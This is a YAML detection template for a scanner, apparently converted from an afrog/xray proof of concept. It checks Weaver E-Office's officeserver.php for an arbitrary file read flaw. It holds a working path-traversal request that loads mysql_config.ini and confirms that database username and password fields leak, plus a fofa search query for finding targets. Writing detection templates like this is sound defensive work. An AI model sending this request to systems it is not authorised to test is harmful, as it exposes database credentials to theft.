# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - dataurl
          - datauser
          - datapassword
          - dataname
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini'
id: weaver-eoffice-officeserver-fileread
info:
  author: zan8in
  description: |-
    泛微OA E-Office officeserver.php文件存在任意文件读取漏洞，攻击者通过漏洞可以下载服务器上的任意文件
    fofa: app="泛微-EOffice"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 泛微OA E-Office officeserver.php 任意文件读取漏洞
  severity: high
  tags: weaver,eoffice,fileread,argus-import
